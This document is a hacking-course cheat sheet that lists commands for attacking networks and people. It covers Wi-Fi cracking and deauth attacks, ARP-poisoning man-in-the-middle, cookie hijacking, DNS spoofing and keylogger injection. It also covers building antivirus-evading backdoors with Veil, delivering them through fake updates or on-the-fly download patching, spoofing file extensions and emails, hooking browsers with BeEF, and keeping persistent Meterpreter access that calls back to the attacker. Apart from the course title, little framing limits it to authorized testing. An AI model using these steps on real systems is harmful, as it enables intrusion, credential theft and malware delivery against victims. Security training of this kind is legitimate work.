# Ethical Hacking Course
Here are the commands that will be used in the course

[Fluxion](https://github.com/FluxionNetwork/fluxion)

[Airgeddon](https://github.com/v1s1t0r1sh3r3/airgeddon)

`apt-get install firmware-atheros`
# Network
## Change MAC Address
* Get the interface down
  * `ifconfig wlan0 down`
* Use macchanger
  * `macchanger --random wlan0`
  * `ifconfig wlan0 hw ether 00:11:22:33:44:55`
* Get the interface up
  * `ifconfig wlan0 up`
## Change Wireless Card Mode
### Method 1
* Start Monitor Mode
  * `airmon-ng start wlan0`
* Stop Monitor Mode
  * `airmon-ng stop wlan0mon`
### Method 2
* Get the interface down
  * `ifconfig wlan0 down`
* Change Mode
  * `iwconfig wlan0 mode monitor`
* Get the interface up
  * `ifconfig wlan0 up`
### Method 3
* Get the interface down
  * `ifconfig wlan0 down`
* Kill Process
  * `airmon-ng check kill`
* Start Monitor Mode
  * `airmon-ng start wlan0`
* Restart Network Manager
  * `service NetworkManager restart`
## Packet Sniffing
[Airodump-ng](https://www.aircrack-ng.org/doku.php?id=airodump-ng)
* Start Sniffing
  * `airodump-ng wlan0mon`
* Sniff In A Specific Network
  * `airodump-ng --channel <network channel> --bssid <network bssid> --write <file-name> wlan0mon`
* Deauth Attacks
  * `aireplay-ng --deauth <num-of-packets> -a <network bssid> -c <target bssid> wlan0mon`
## Crack WEP
### Busy Network
* Start airodump-ng in the target network
* Crack
  * `aircrack-ng <network-file>`
### NOT Busy Network
* Associate with the target network (tell the network that I wnat to connect to it)
* Fake Auth (Associate)
  * `aireplay-ng --fakeauth 0 -a <network bssid> -h <wireless adapter MAC> wlan0mon`
* Packet Injection
  * `aireplay-ng --arpreplay -b <network bssid> -h <wireless adapter MAC> wlan0mon`
## Crack WPA/WPA2
### With WPS
* If wash is not working
  * `mkdir /etc/reaver`
* Check if the network has WPS
  * `wash -i wlan0mon`
* Associate with the target network with a delay of 30s
* Attack
  * `reaver -b <network bssid> -c <network channel> -i wlan0mon -vvv --no-associate`
* If you get an error get an [older version of reaver](https://files.fm/u/z5ha7t93)
### Without WPS
* Start airodump-ng in the target
* Deauth a client to capture the WPA Hanshake
* Crack the Key
  * `aircrack-ng <handshake-file> -w <word-list>`
### Create a Wordlist
`crunch <min-length> <max-length> <characters> -o <file-name> -t <pattern>`
## Information Gathering
After authenticating to a network you gather information about it.
### Using Netdiscover
* `netdiscover -r <network internal IP>.1/24 -i wlan0`
### Using Autoscan
* download [Autoscan](http://autoscan-network.com/download)
* add 32bit compatibility `dpkg --add-architecture i386`
* update `apt-get update`
* download and install library `apt-get install libc6:i386`
* install Autoscan in the terminal running `./<downaloaded file>`
* run Autoscan
### Using Nmap (Zenmap)
* run `zenmap`
* in Target put `<network internal IP>.1/24`
* play arround with Profile
## Man In The Middle (MITM) Atacks
These atacks only work with HTTP sites without HSTS
### ARP Poisoning Using arpspoof
* Tell the target client that I am the router
  * `arpsoof -i wlan0 -t <target client IP> <router IP>`
* Tell the router that I am the target client
  * `arpsoof -i wlan0 -t <router IP> <target client IP>`
* Enable IP forward to allow packets to flow trough my device without being dropped
  * `echo 1 > /proc/sys/net/ipv4/ip_forward`
### ARP Poisoning Using MITMf
* Tell the target client that I am router
  * `mitmf --arp --spoof --gateway <router IP> --target <target client IP> -i wlan0`

This way you can see all the post request made by the target client.

To bypass HTTPS request use SSLstrip to downgrade HTTPS to an HTTP request.

### Session Hijacking
If the user clicks on the "remember me" button a cookie is made in the browser. So we sniff the cookies and inject them to our browser.
* Install Ferret
  * `apt-get install ferret-sidejack`
* Become the MITM
* Capture Cookies
  * `ferret -i wlan0`
* Web GUI to see the cookies and inject them into my browser
  * `hamster`
### DNS Spoofing
* Start Apache Server
  * `service apache2 start`
  * The content of the page is in `/var/www/html`
* Edit DNS settings
  * `nano /etc/mitmf/mitmf.conf`
  * Edit the `A` record, that is responsible for translate names to IP adresses
* Become the MITM
  * `mitmf --arp --spoof --gateway <router IP> --target <target client IP> -i wlan0 --dns`
### Capture Screen & Injecting Keylogger
* Capture Screen
  * `mitmf --arp --spoof --gateway <router IP> --target <target client IP> -i wlan0 --screen`
* Injecting Keylogger
  * `mitmf --arp --spoof --gateway <router IP> --target <target client IP> -i wlan0 --jskeylogger`
### Code Injection
* Inject JS
  * `mitmf --arp --spoof --gateway <router IP> --target <target client IP> -i wlan0 --inject --js-payload "alert('hello from hacker')"`
### Fake Access Point (Honeypot) to become the MITM
* You need to have internet connection and a wireless card to broadcast it.
  * `apt install mana-toolkit`
* Edit the files bellow. Change the interface and the ssid. After change the upstream and the phy.
  * `nano /etc/mana-toolkit/hostpad-mana.conf`
  * `nano /usr/share/mana-toolkit/run-mana/start-nat-simple.sh`
* Start the network
  * `bash /usr/share/mana-toolkit/run-mana/start-nat-simple.sh`
### Wireshark
Use Wireshark to sniff the traffic of a network card. If tou are the MITM you can sniff the trafic of the target computet too.
# Gaining Access
## Server Side Attacks
Don't require user interaction. All is needed is the target IP.
If you can ping the IP, go and hack it.
### Information Gathering
Scan the IP with Zenmap.
### Metasploit
Metasploit is an exploit development and execution tool.

It can also be used to carry out other penetration testing tasks such as port scans, service identification and post exploitation tasks.

Payloads are small pieces of code that will be executed on the target computer ounce the vunerability has been exploited.

**Bind** payloads: open a port on the target computer and the attacker connects to that port.

**Reverse** payloads: open a port on the attacker computer and the target connects to that port. This allows to bypass firewalls.

* Run metasploit console
  * `msfconsole`
* Shows help
  * `help`
* Show exploits, payloads, auxiliaries or options
  * `show [option]`
* Use a certain exploit, payload or auxiliary
  * `use [module]`
* Configure [option] to have a value of [value]
  * `set [option] [value]`
* Run the current task
  * `exploit`
### Metasploit Community (MSFC)
Metasploit community is a GUI that can discover open ports and installed 
services on the target machine, not only that but it maps these services 
to metasploit modules and exploits and allow us to run these modules 
from the web GUI

To download it [click here](https://www.rapid7.com/products/metasploit/metasploit-community-registration.jsp)

* Start metasploit community
  * `systemctl start metasploit`
* Open the program
* Got to a browser and navigate to `https://localhost:3790`

Log in and put the activation key.

After the setup go to project, create a new project, scan the target and launch it. Then go on analysis, hosts, click on the IP, and play with the tabs.

### Nexpose
Nexpose is a vulnerability management framework, it allows us to 
discover, assess and act on discovered vulnerabilities, it also tells us a lot 
of info about the discovered vulnerabilities, weather they are exploitable 
and helps us write a report at the end of the assessment.

To download it [click here](http://www.rapid7.com/products/nexpose/compare-downloads.jsp)

* Stop postgresql
  * `systemctl stop postgresql`
* Got to the program directory
  * `cd /opt/rapid7/nexpose`
* Start the program
  * `./nsc/nsc.sh`
* Got to a browser and navigate to `https://localhost:3780`

Log in and put the activation key.

After the setup go to home, create, site, add a name, the IP in assets and a group, 
save & scan. Play with the tabs.

## Client Side Attacks
If you can't ping the target IP or it's hidden behind a router use this attack.

It requires user interaction and Social Engineering is very important 
as well as information gathering.

### Veil
Veil is a framework for generating undetectable backdoors.
A backdoor is a file that gives full access over the machine that it gets executed on.

[Click here](https://github.com/Veil-Framework/Veil) and clone it.

#### Generate the backdoor
* Got to the Veil directory and set up the program
  * `./config/setup.sh --force --silent`
* Start the program
  * `Veil.py`
* See available tools
  * `list`
* Use Evasion to create an undetectable backdoor
  * `use 1`
* See available payloads
  * `list`
* Use a playload
  * `use [payload number]`
* Configure the backdoor, set Lhost to your IP
  * `set [option] [value]`
  * `options`
* Make the backdoor
  * `generate`

Check if your backdoor is being detected by anti-virus by going to
[No Distribute](https://nodistribute.com/) and upload your file.

### Listen for incomming connections

* Listen with metasploit
  * `msfconsole`
  * `use exploit/multi/handler`
  * `show options`
  * Set the correct the correct payload, Lhost and Lport, and then exploit.

### Deliver the backdoor by a fake update

Fake an update for an already installed program.

Install backdoor instead of the update.

Requires DNS spoofing + Evilgrade (a server to serve the update).

* Install Evilgrade
* Check programs that can be hijacked
  * `show modules`
* Select a program
  * `configure [module]`
  * `show options`
* Set backdoor location and other options if you want
  * `set agent [backdoor location]`
* Start server
  * `start`
* Start dns spoofing and handler by setting any updates requests to evilgrade (your IP).

### Deliver the backdoor by backdooring downloads on the fly

Backdoor any .exe file that the target downloads using the Backdoor Factory Proxy (bdfproxy).

We need to be in the middle of the connection.

* Edit bdfproxy config file and set your IP address and proxy mode to transparent
  * ` nano /etc/bdfproxy/bdfproxy.cfg`
* Start bdfproxy
  * `bdfproxy`
* Redirect traffic to bdfoxy (the proxy is running un port 8080)
  * `iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port 8080`
* Become the MITM
* Start listening for connections
  * `msfconsole -r /usr/share/bdfproxy/bdf_proxy_msf_resource.rc`

### Maltego - Social Engineering
Maltego is an information gathering tool that can be used to collect information about anything.
The target can be a website, company, person, and do on. You can discover entities 
associated with the taget and everything will be displayed on a nice graph.

### Inject the backdoor in any file

The target will receive a file with a backdoor, when this file is opened 
the backdoor will be executed in the background.

This will be done with a download and execute script which will download 
the file and the backdoor.

In the script, change `url1` with the real file url and the `url2` with the 
backdoor url.

Then the script needs to be compiled with Autoit, software and programming language that the script was written in. 
Change the script extension to `.au3`. Select the source, destination and icon 
for the backdoored file and convert it.

### Spoof File Extensions

To spoof file extensions use the Right-to-Left Override character.
This way you can make a `.exe` file looks like a `.jpg` file.

Beacause some browser are removing this character you can compress 
the file to keep the spoofed extension.

### Spoof Emails

Email spoofing is the ability to email someone with a any email address.

This can be achived using a trusted email service to send the email.
You can use a webhosting account, create your mail server or use a SMTP server.

A good and free SMTP server is [Sendgrid](https://sendgrid.com).
Sign up for the free plan, click in integrate using SMTP relay and generate a key.

Then use the program`sendemail` to send the spoofed email.
The authentication will be done with the username and password generated by Sendgrid, 
put the from and to emails, the subject, message and the header.

`sendemail -s [server:port] -xu [user] -xp [password] -f [from email] -t [to email] -u [subject] -m [message] -o message-header="From: [name] <email>"`

### BeEf

BeEF is a Browser Exploitation Framework that allows to perform a nuber of attacks on a hooked target.
To hook someone the target needs to load a hook script generated by BeEF.

Once you start BeEF a URL for the web interface will be shown as well as the hook script.

To hook someone you can use DNS spoofing, inject the hook.js file using MITM or Social Engineer.

When the target is hooked you can execute commands on the target browser.
You can search things to do in the `Commands` tab.

Note: some commands just work in `http` protocol.

## Post Explotation

After the attacker gains access to the target computer, the attacker 
have full control over the computer, everything can be done.

### Meterpreter

* Get help
  * `help`
* Background current session
  * `background`
* List sesions
  * `sessions -l`
* Interact with a session
  * `sessions -i [session number]`
* Display system info
  * `sysinfo`
* Display interfaces info
  * `ipconfig`
  * `ifconfig`
* Show current user
  * `getuid`
* Download file
  * `download [file]`
* Upload file
  * `upload [file]`
* Execute file
  * `execute [file]`

#### Maintaining Access

* Method 1 - Using Veil
  * Instead of using `rev_http_service` module use `reverse_tcp_service` module.
  * But it does not always work.
* Method 2 - Using persistence module
  * In the meterpreter session run `run persistence -U -i [seconds] -p [port(80)] -r [attacker IP]`
  * This is detectable by Antiviruses.
* Method 3 - Metasploit + Veil
  * The backdor will be injected as a service and the computer will try to connect to the attacker
  every time the target powers on his computer.
  * `use exploit/windows/local/persistence`
  * `options`
  * `set EXE_NAME browser`
  * `set SESSION [session number]`
  * `show advanced`
  * `set EXE::Custom [payload path]`
  * `exploit`
  * Now you just have to listen for incomming connections and a session will be opened.
